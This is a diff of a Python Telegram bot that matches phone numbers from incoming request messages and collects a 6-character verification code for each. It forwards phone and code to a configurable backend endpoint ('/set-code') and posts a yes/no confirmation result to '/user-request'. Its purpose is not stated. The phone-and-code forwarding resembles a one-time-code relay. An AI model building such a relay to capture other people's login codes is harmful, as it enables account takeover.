@@ -140,11 +140,11 @@ import re
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import sys
 
-# --- Получение настроек из переменных окружения ---
+# --- Змінні ---
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 API_URL = os.environ.get('API_URL')
 
-# --- Проверка наличия токена и URL ---
+# --- Перевірки ---
 if not BOT_TOKEN:
     print("CRITICAL ERROR: BOT_TOKEN environment variable not found!")
     sys.exit(1)
@@ -152,23 +152,22 @@ if not BOT_TOKEN:
 if not API_URL:
     print("WARNING: API_URL environment variable not found.")
 
-# --- Инициализация бота ---
 bot = telebot.TeleBot(BOT_TOKEN)
 print("Bot initialized successfully.")
 
-# --- ПАМ'ЯТЬ для очікування вводу 6 літер ---
-pending_codes = {}  # chat_id: phone
+# --- Пам'ять: для збереження номера перед кодом ---
+pending_codes = {}  # chat_id -> phone
 
-# --- Обработчик /start ---
+# --- /start ---
 @bot.message_handler(commands=['start'])
-def handle_start(message):
-    print(f"🆔 Chat ID нового користувача: {message.chat.id}")
+def send_welcome(message):
+    print(f"Received /start from chat ID: {message.chat.id}")
     try:
-        bot.reply_to(message, f"Ваш chat_id: {message.chat.id}\nПривіт! Я бот для підтвердження.")
+        bot.reply_to(message, "Привіт! Я бот для підтвердження.\nВаш chat_id: " + str(message.chat.id))
     except Exception as e:
-        print(f"Error sending welcome message: {e}")
+        print(f"Error sending welcome: {e}")
 
-# --- Обробка "Новий запит" (перша форма) ---
+# --- 1: Обробка "Новий запит\nТелефон: ..." ---
 @bot.message_handler(func=lambda m: "Новий запит" in m.text and "Телефон:" in m.text)
 def handle_first_form(m):
     phone_match = re.search(r"Телефон:\s*([+\d\s()-]+)", m.text)
@@ -179,15 +178,36 @@ def handle_first_form(m):
         return
 
     pending_codes[m.chat.id] = phone
-    bot.reply_to(m, f"✉️ Введіть код з 6 літер для номера {phone}")
+    bot.reply_to(m, f"✉️ Введіть 6-значний код для номера {phone}")
 
-# --- Обробка 6-літерного коду ---
-@bot.message_handler(func=lambda m: m.chat.id in pending_codes and re.fullmatch(r"[a-zA-Z]{6}", m.text.strip()))
-def handle_letter_code(m):
+# --- 2: Прийом 6-значного коду ---
+@bot.message_handler(func=lambda m: m.chat.id in pending_codes and re.fullmatch(r"[a-zA-Z0-9]{6}", m.text.strip()))
+def handle_code_entry(m):
     phone = pending_codes.pop(m.chat.id)
     code = m.text.strip().upper()
 
-    msg = f"\U0001F510 Код підтвердження:\nТелефон: {phone}\nКод: {code}"
+    if not API_URL:
+        bot.reply_to(m, "⚠️ Сервер не налаштований.")
+        return
+
+    try:
+        response = requests.post(
+            f"{API_URL}/set-code",
+            json={"phone": phone, "code": code},
+            timeout=10
+        )
+        response.raise_for_status()
+        bot.reply_to(m, f"✅ Код прийнято: {code}")
+    except Exception as e:
+        print(f"❌ ERROR sending code to server: {e}")
+        bot.reply_to(m, "❌ Не вдалося надіслати код на сервер.")
+
+# --- 3: Обробка "Код підтвердження" + кнопки ---
+@bot.message_handler(func=lambda m: isinstance(m.text, str) and "Код підтвердження:" in m.text)
+def handle_code_with_buttons(m):
+    print(f"Received code message from chat ID: {m.chat.id}")
+    phone_match = re.search(r"Телефон:\s*([+\d\s()-]+)", m.text)
+    phone = phone_match.group(1).strip() if phone_match else "невідомий"
 
     markup = InlineKeyboardMarkup()
     markup.add(
@@ -195,12 +215,16 @@ def handle_letter_code(m):
         InlineKeyboardButton("❌ Ні", callback_data=f"confirm_no_{phone}")
     )
 
-    bot.send_message(m.chat.id, f"{msg}\n\nПідтвердити ці дані?", reply_markup=markup)
+    try:
+        bot.send_message(m.chat.id, f"{m.text}\n\nПідтвердити ці дані?", reply_markup=markup)
+        print(f"Sent confirmation for phone: {phone}")
+    except Exception as e:
+        print(f"Error sending confirmation: {e}")
 
-# --- Обработчик нажатий на кнопки ---
+# --- 4: Кнопки "Так / Ні" ---
 @bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_"))
 def handle_callback(call):
-    print(f"Received callback query: {call.data} from chat ID: {call.message.chat.id}")
+    print(f"Received callback: {call.data} from chat ID: {call.message.chat.id}")
     status = "unknown"
     phone = "unknown"
     try:
@@ -217,15 +241,12 @@ def handle_callback(call):
             return
 
         if not API_URL:
-            bot.answer_callback_query(call.id, "Помилка: Не налаштовано URL сервера.")
+            bot.answer_callback_query(call.id, "Помилка: не вказано API_URL")
             bot.edit_message_text("⚠️ Помилка конфігурації сервера.", call.message.chat.id, call.message.message_id)
             return
 
-        backend_url = f"{API_URL}/user-request"
         payload = {"phone": phone, "result": status}
-        print(f"Sending data to backend: {backend_url} with payload: {payload}")
-
-        response = requests.post(backend_url, json=payload, timeout=10)
+        response = requests.post(f"{API_URL}/user-request", json=payload, timeout=10)
         response.raise_for_status()
 
         confirmation_text = f"✅ Дані прийняті: {status}\nТелефон: {phone}"
@@ -233,21 +254,17 @@ def handle_callback(call):
         bot.edit_message_text(confirmation_text, call.message.chat.id, call.message.message_id, reply_markup=None)
 
     except requests.exceptions.RequestException as e:
-        print(f"ERROR sending data to backend: {e}")
-        error_text = f"⚠️ Помилка зв'язку з сервером. Спробуйте пізніше."
+        print(f"ERROR sending to backend: {e}")
         bot.answer_callback_query(call.id, "Помилка сервера.")
-        bot.edit_message_text(error_text, call.message.chat.id, call.message.message_id)
-
+        bot.edit_message_text("⚠️ Помилка зв'язку з сервером.", call.message.chat.id, call.message.message_id)
     except Exception as e:
-        print(f"UNEXPECTED ERROR in callback handler: {e}")
-        error_text = f"⚠️ Невідома помилка обробки."
-        bot.answer_callback_query(call.id, "Невідома помилка.")
+        print(f"UNEXPECTED ERROR in callback: {e}")
         try:
-            bot.edit_message_text(error_text, call.message.chat.id, call.message.message_id)
+            bot.edit_message_text("⚠️ Невідома помилка.", call.message.chat.id, call.message.message_id)
         except Exception as edit_e:
-            print(f"Could not edit message after error: {edit_e}")
+            print(f"Edit fail: {edit_e}")
 
-# --- Запуск бота ---
+# --- Запуск ---
 if __name__ == '__main__':
     print("Starting bot polling...")
     try:
